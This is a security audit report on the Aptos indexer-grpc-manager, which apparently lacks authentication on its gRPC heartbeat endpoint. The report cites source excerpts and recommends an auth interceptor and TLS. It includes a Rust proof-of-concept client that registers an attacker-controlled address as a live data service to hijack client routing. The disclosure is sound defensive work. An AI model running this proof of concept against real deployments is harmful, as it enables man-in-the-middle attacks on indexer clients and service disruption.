# Audit Report

## Title
Unauthenticated gRPC Access Enables Indexer State Manipulation and Service Disruption

## Summary
The indexer-grpc-manager service exposes an unauthenticated gRPC server that allows any network attacker to manipulate critical indexer metadata, register malicious data services, alter the master node designation, and corrupt version tracking state. This breaks the integrity of the indexer infrastructure and can lead to denial of service or man-in-the-middle attacks on indexer clients.

## Finding Description

The gRPC server started in `start()` function lacks any authentication or authorization layer. [1](#0-0) 

The service exposes three critical RPC endpoints without authentication:

1. **Heartbeat RPC**: Accepts arbitrary service registration messages [2](#0-1) 

2. **GetTransactions RPC**: Provides unauthenticated access to transaction data [3](#0-2) 

3. **GetDataServiceForRequest RPC**: Returns routing information to data services [4](#0-3) 

The `handle_heartbeat` method processes unauthenticated messages and updates critical state: [5](#0-4) 

**Attack Vector 1 - Fake Data Service Registration**: An attacker sends `HeartbeatRequest` with malicious `LiveDataServiceInfo` or `HistoricalDataServiceInfo`. The manager adds these to its routing tables without validation: [6](#0-5) 

When clients call `get_data_service_for_request`, they get routed to attacker-controlled servers, enabling man-in-the-middle attacks.

**Attack Vector 2 - Master Address Manipulation**: An attacker sends `HeartbeatRequest` with `GrpcManagerInfo` containing a malicious `master_address`. The manager unconditionally updates its local state: [7](#0-6) 

Since only the master node runs the `FileStoreUploader`, changing the master address can cause indexing to stop functioning.

**Attack Vector 3 - Version State Corruption**: An attacker sends `FullnodeInfo` with fake `known_latest_version`, corrupting the version tracking: [8](#0-7) 

The protobuf definition confirms no authentication token fields exist: [9](#0-8) 

Unlike the data-service which has authentication infrastructure, the grpc-manager has none. Authentication constants exist in the codebase but are unused by the manager.

## Impact Explanation

This vulnerability enables:
- **Service Disruption**: Manipulating master_address designation causes FileStoreUploader to stop, breaking indexing pipeline
- **Data Integrity Attacks**: Clients routed to malicious servers receive fake transaction data, compromising application logic
- **Information Disclosure**: Attackers can call GetTransactions to retrieve all cached transaction data
- **Metadata Poisoning**: Corrupted version tracking causes incorrect caching and GC decisions

Per Aptos bug bounty criteria, this qualifies as **High Severity** due to significant protocol violations and API disruption, or potentially **Medium Severity** for state inconsistencies requiring operator intervention.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is trivially exploitable:
1. Attacker needs only network access to the listen_address (typically exposed for legitimate services)
2. No authentication tokens, credentials, or special permissions required
3. Standard gRPC clients can craft malicious HeartbeatRequest messages
4. The service processes all incoming requests without validation
5. Deployment configurations typically bind to `0.0.0.0` for accessibility

The attack requires minimal sophistication and can be automated.

## Recommendation

**Implement Authentication Layer:**

1. Add gRPC interceptor for token validation:
```rust
use tonic::service::Interceptor;
use aptos_indexer_grpc_utils::constants::GRPC_AUTH_TOKEN_HEADER;

fn auth_interceptor(req: Request<()>) -> Result<Request<()>, Status> {
    let token = req.metadata().get(GRPC_AUTH_TOKEN_HEADER)
        .ok_or_else(|| Status::unauthenticated("Missing auth token"))?;
    // Validate token against whitelist
    validate_token(token)?;
    Ok(req)
}
```

2. Apply interceptor to service:
```rust
let service = GrpcManagerServer::with_interceptor(
    GrpcManagerService::new(...),
    auth_interceptor
)
.send_compressed(CompressionEncoding::Zstd)
...
```

3. Add configuration for whitelisted tokens:
```rust
pub struct IndexerGrpcManagerConfig {
    // ... existing fields
    pub whitelisted_auth_tokens: Vec<String>,
    pub disable_auth_check: bool,  // for testing only
}
```

4. Implement TLS for transport security (following the data-service pattern)

5. Add address validation to verify heartbeat sources match configured addresses

## Proof of Concept

**Rust Client PoC:**

```rust
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, 
    service_info::Info, LiveDataServiceInfo
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to vulnerable grpc-manager
    let channel = Channel::from_static("http://target-grpc-manager:50051")
        .connect()
        .await?;
    
    let mut client = GrpcManagerClient::new(channel);
    
    // Attack: Register malicious data service
    let malicious_service = LiveDataServiceInfo {
        chain_id: 1,
        timestamp: Some(aptos_indexer_grpc_utils::timestamp_now_proto()),
        known_latest_version: Some(999999999),
        stream_info: None,
        min_servable_version: Some(0),
    };
    
    let request = HeartbeatRequest {
        service_info: Some(ServiceInfo {
            address: Some("http://attacker-server:8080".to_string()),
            info: Some(Info::LiveDataServiceInfo(malicious_service)),
        }),
    };
    
    // Send unauthenticated heartbeat - will succeed
    let response = client.heartbeat(request).await?;
    
    println!("Attack successful! Response: {:?}", response);
    println!("Attacker service now registered in routing table");
    println!("Future clients will be routed to attacker-controlled server");
    
    Ok(())
}
```

**Expected Result**: The heartbeat succeeds without authentication, the malicious service is registered, and subsequent clients calling `get_data_service_for_request` may be routed to the attacker's server.

## Notes

While this vulnerability affects the indexer infrastructure (not core consensus), it has significant impact on the Aptos ecosystem as many applications depend on indexer data for their functionality. The lack of authentication is a critical oversight, especially given that authentication infrastructure exists elsewhere in the codebase but was not applied to the grpc-manager service.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/grpc_manager.rs (L91-129)
```rust
    pub(crate) fn start(&self, service_config: &ServiceConfig) -> Result<()> {
        let service = GrpcManagerServer::new(GrpcManagerService::new(
            self.chain_id,
            self.metadata_manager.clone(),
            self.data_manager.clone(),
        ))
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
        let server = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
            .add_service(service);

        let (tx, rx) = channel();
        tokio_scoped::scope(|s| {
            s.spawn(async move {
                self.metadata_manager.start().await.unwrap();
            });
            s.spawn(async move { self.data_manager.start(self.is_master, rx).await });
            if self.is_master {
                s.spawn(async move {
                    self.file_store_uploader
                        .lock()
                        .await
                        .start(self.data_manager.clone(), tx)
                        .await
                        .unwrap();
                });
            }
            s.spawn(async move {
                info!("Starting GrpcManager at {}.", service_config.listen_address);
                server.serve(service_config.listen_address).await.unwrap();
            });
        });

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L129-146)
```rust
    async fn get_transactions(
        &self,
        request: Request<GetTransactionsRequest>,
    ) -> Result<Response<TransactionsResponse>, Status> {
        let request = request.into_inner();
        let transactions = self
            .data_manager
            .get_transactions(request.starting_version(), MAX_SIZE_BYTES_FROM_CACHE)
            .await
            .map_err(|e| Status::internal(format!("{e}")))?;

        Ok(Response::new(TransactionsResponse {
            transactions,
            chain_id: Some(self.chain_id),
            // Not used.
            processed_range: None,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L148-196)
```rust
    async fn get_data_service_for_request(
        &self,
        request: Request<GetDataServiceForRequestRequest>,
    ) -> Result<Response<GetDataServiceForRequestResponse>, Status> {
        let request = request.into_inner();

        if request.user_request.is_none()
            || request
                .user_request
                .as_ref()
                .unwrap()
                .starting_version
                .is_none()
        {
            let candidates = self.metadata_manager.get_live_data_services_info();
            if let Some(candidate) = candidates.iter().next() {
                let data_service_address = candidate.0.clone();
                return Ok(Response::new(GetDataServiceForRequestResponse {
                    data_service_address,
                }));
            } else {
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            }
        }

        let starting_version = request.user_request.unwrap().starting_version();

        let data_service_address =
            // TODO(grao): Use a simple strategy for now. Consider to make it smarter in the
            // future.
            if let Some(address) = self.pick_live_data_service(starting_version) {
                COUNTER.with_label_values(&["live_data_service_picked"]).inc();
                address
            } else if let Some(address) = self.pick_historical_data_service(starting_version).await {
                COUNTER.with_label_values(&["historical_data_service_picked"]).inc();
                address
            } else {
                COUNTER.with_label_values(&["failed_to_pick_data_service"]).inc();
                return Err(Status::internal(
                    "Cannot find a data service instance to serve the provided request.",
                ));
            };

        Ok(Response::new(GetDataServiceForRequestResponse {
            data_service_address,
        }))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L489-509)
```rust
    fn handle_live_data_service_info(
        &self,
        address: GrpcAddress,
        mut info: LiveDataServiceInfo,
    ) -> Result<()> {
        let mut entry = self
            .live_data_services
            .entry(address.clone())
            .or_insert(LiveDataService::new(address));
        if info.stream_info.is_none() {
            info.stream_info = Some(StreamInfo {
                active_streams: vec![],
            });
        }
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L533-550)
```rust
    fn handle_fullnode_info(&self, address: GrpcAddress, info: FullnodeInfo) -> Result<()> {
        let mut entry = self
            .fullnodes
            .entry(address.clone())
            .or_insert(Fullnode::new(address.clone()));
        entry.value_mut().recent_states.push_back(info);
        if let Some(known_latest_version) = info.known_latest_version {
            trace!(
                "Received known_latest_version ({known_latest_version}) from fullnode {address}."
            );
            self.update_known_latest_version(known_latest_version);
        }
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L552-568)
```rust
    fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
        self.master_address
            .lock()
            .unwrap()
            .clone_from(&info.master_address);

        let mut entry = self
            .grpc_managers
            .entry(address.clone())
            .or_insert(Peer::new(address));
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** protos/proto/aptos/indexer/v1/grpc.proto (L74-80)
```text
message HeartbeatRequest {
  optional ServiceInfo service_info = 1;
}

message HeartbeatResponse {
  optional uint64 known_latest_version = 1;
}
```
